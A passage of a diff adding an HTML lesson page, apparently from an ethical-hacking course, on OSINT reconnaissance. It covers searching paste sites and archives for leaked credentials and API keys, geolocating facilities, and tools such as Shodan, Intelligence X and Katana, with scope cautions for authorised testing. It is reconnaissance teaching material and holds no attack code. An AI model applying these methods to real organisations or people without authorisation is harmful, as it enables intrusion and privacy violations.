+        Social platforms and paste sites often reveal sensitive information that
+        is not visible in normal web search. For example:
+      </p>
+
+      <ul>
+        <li>
+          Monitoring for leaks on paste sites using platforms like
+          <strong>Intelligence X</strong> or manual searches.
+        </li>
+        <li>
+          Reviewing paste content discovered through the
+          <strong>WayBack Machine</strong> or other archives.
+        </li>
+        <li>
+          Checking for credentials, API keys, or configuration snippets that
+          reference in-scope domains.
+        </li>
+      </ul>
+
+      <h3>Geolocation and Visual Verification</h3>
+
+      <p>
+        Tools such as <strong>Google Earth Pro</strong>, geolocation APIs, and
+        satellite imagery archives support location-based OSINT:
+      </p>
+
+      <ul>
+        <li>Verifying the physical location of data centers, offices, or branches.</li>
+        <li>Cross-checking facility layouts mentioned in public documents.</li>
+        <li>Supporting physical or hybrid Red Team exercises with visual context.</li>
+      </ul>
+
+      <div class="reminder-lightblue">
+        <strong>OPSEC Principle:</strong>
+        <span>Be especially cautious with social media and geolocation data. Avoid
+        re-identifying individuals unless the engagement scope explicitly allows it.</span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: SUPPORTING RESOURCES                                -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="resources">
+      <h2 id="resources">10. Supporting Resources &amp; Recommended Reading</h2>
+
+      <ul>
+        <li>
+          <a href="https://www.isearchfrom.com" target="_blank" rel="noopener">
+            isearchfrom.com: Simulated Regional Google Searches
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Compare Google Dorks across countries and languages</small>
+        </li>
+        <li>
+          <a href="https://archive.org/web/" target="_blank" rel="noopener">
+            Internet Archive: WayBack Machine
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Retrieve historical snapshots and deleted pages</small>
+        </li>
+        <li>
+          <a href="https://www.shodan.io" target="_blank" rel="noopener">
+            Shodan
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Discover exposed infrastructure and internet-facing devices</small>
+        </li>
+        <li>
+          <a href="https://intelx.io" target="_blank" rel="noopener">
+            Intelligence X
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Search leaked data, dark web records, and archives</small>
+        </li>
+        <li>
+          <a href="https://osintframework.com" target="_blank" rel="noopener">
+            OSINT Framework
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Navigate OSINT tooling by category and data type</small>
+        </li>
+        <li>
+          <a href="https://github.com/projectdiscovery/katana" target="_blank" rel="noopener">
+            Katana (ProjectDiscovery)
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: High-speed crawler for URL and endpoint discovery</small>
+        </li>
+      </ul>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: CHAPTER SUMMARY                                     -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="search-intel-chapter-summary">
+      <h2 id="search-intel-chapter-summary">11. Chapter Summary</h2>
+
+      <p>
+        By completing this chapter you should now be able to:
+      </p>
+
+      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin: 20px 0;">
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Apply region-aware reconnaissance techniques.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">Using isearchfrom.com to simulate searches from different countries.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Leverage the WayBack Machine for historical exposures.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">Recover deleted pages, files, and configuration remnants.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Combine dorks, regions, and archives into a repeatable workflow.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">Systematic search intelligence for penetration testing.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Use advanced OSINT platforms.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">Archive.today, Intelligence X, and OSINT Framework.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Leverage Shodan, VirusTotal, and Censys for exposed infrastructure.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">Discover forgotten hosts, misconfigured services, and certificate data.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Automate OSINT discovery with CLI tools.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">GAU, Waymore, WaybackUrls, and Katana.</span></span>
+        </div>
+
+      </div>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <strong>Why This Matters:</strong>
+        <span style="display: block; margin-top: 5px;">
+          Search intelligence is the foundation of effective reconnaissance. By combining regional
+          awareness, historical archives, and automated discovery, operators can build a comprehensive
+          picture of a target's external footprint without ever touching the target's perimeter
+          directly. These techniques are essential for both offensive assessments and defensive
+          exposure monitoring.
+        </span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: KEY TAKEAWAYS                                       -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="search-intel-takeaways">
+      <h2 id="search-intel-takeaways">12. Key Takeaways</h2>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Search intelligence key takeaways">
+          <thead>
+            <tr>
+              <th>Concept</th>
+              <th>Why It Matters</th>
+              <th>Security Impact</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Regional Awareness Matters</strong></td>
+              <td>Search results vary by country; sensitive content may be visible in one region but not another.</td>
+              <td>Region-aware recon reveals geo-targeted exposures and censorship blind spots.</td>
+            </tr>
+            <tr>
+              <td><strong>Archives Are Persistent</strong></td>
+              <td>Deleted pages often remain in the WayBack Machine and other archives for years.</td>
+              <td>Historical exposures can still be leveraged by adversaries or recovered by defenders.</td>
+            </tr>
+            <tr>
+              <td><strong>Combine Tools for Maximum Coverage</strong></td>
+              <td>Dorks, regions, archives, and asset search engines each reveal different parts of the attack surface.</td>
+              <td>Cross-referencing multiple sources reduces blind spots and improves intelligence quality.</td>
+            </tr>
+            <tr>
+              <td><strong>Automation Scales Discovery</strong></td>
+              <td>CLI tools like GAU, Waymore, and Katana automate URL and endpoint discovery.</td>
+              <td>Automation enables continuous monitoring and faster identification of new exposures.</td>
+            </tr>
+            <tr>
+              <td><strong>Treat All Findings as Leads, Not Proof</strong></td>
+              <td>Shodan, Censys, and VirusTotal results require validation before action.</td>
+              <td>Prevents false positives from driving unnecessary remediation or escalation.</td>
+            </tr>
+            <tr>
+              <td><strong>Document Everything</strong></td>
+              <td>Search results change quickly; reproducible queries are essential for reporting and retests.</td>
+              <td>Auditability supports legal defensibility and peer review.</td>
+            </tr>
+            <tr>
+              <td><strong>Social Media and Paste Sites Are High-Yield</strong></td>
+              <td>Credentials, API keys, and configuration snippets are often accidentally exposed on paste sites.</td>
+              <td>Proactive monitoring reduces the window of exposure for leaked credentials.</td>
+            </tr>
+            <tr>
+              <td><strong>Geolocation Provides Operational Context</strong></td>
+              <td>Satellite imagery and geolocation APIs support physical and hybrid Red Team exercises.</td>
+              <td>Contextual awareness improves targeting and reduces operational risk.</td>
+            </tr>
+            <tr>
+              <td><strong>Third-Party Data Requires Careful Handling</strong></td>
+              <td>Leaked data from OSINT platforms may contain sensitive or personal information.</td>
+              <td>Legal and compliance risks increase with mishandling; follow client data-handling policies.</td>
+            </tr>
+            <tr>
+              <td><strong>Search Is a Force Multiplier</strong></td>
+              <td>Disciplined search intelligence reduces the time between reconnaissance and actionable findings.</td>
+              <td>Accelerates engagement timelines and improves the quality of final reports.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- REDOPS REMINDER                                               -->
+    <!-- ============================================================ -->
+
+    <div class="info-remember" style="margin: 15px 0;">
+      <em>RedOps Reminder:</em> Treat search engines and archives as quiet sensors — the more disciplined your queries, 
+      the more precise your attack surface map becomes. Always document your dorks, validate your findings, and 
+      keep your investigations auditable and defensible.
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- FLOATING NAVIGATION                                           -->
+    <!-- ============================================================ -->
+
+    <div class="lesson-nav-container">
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/2-open-source-intelligence/09-custom-search-engines" class="nav-link-btn">👈 Back</a>
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/2-open-source-intelligence/11-ftp-search" class="nav-link-btn">Next 👉</a>
+    </div>
+
+    </article>
+  </main>
+</body>
+</html>
